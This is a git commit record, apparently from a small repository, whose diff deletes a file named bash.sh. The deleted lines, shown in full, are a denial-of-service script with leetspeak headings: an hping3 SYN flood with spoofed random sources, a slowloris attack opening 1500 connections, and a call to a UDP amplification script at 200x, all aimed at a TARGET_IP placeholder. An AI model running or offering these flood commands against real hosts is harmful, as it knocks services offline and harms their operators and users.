ab94e0f8582c8300856908963c0ab559976e16c6
TeamDitzzOfficial <ditzzzofficial161@gmail.com>
2026-01-01 23:16:18 +0700

    Delete bash.sh

--- bash.sh
+++
@@ -1,8 +0,0 @@
-# N3TW0RK L4Y3R D3STRUCT10N
-sudo hping3 --flood --rand-source --syn -p 80 TARGET_IP
-
-# 5L0W L0R1S T0RTUR3
-sudo slowloris -p 80 -s 1500 TARGET_IP
-
-# UDP 4MPL1F1C4T10N
-python3 udp_amplification.py --target TARGET_IP --amp 200x
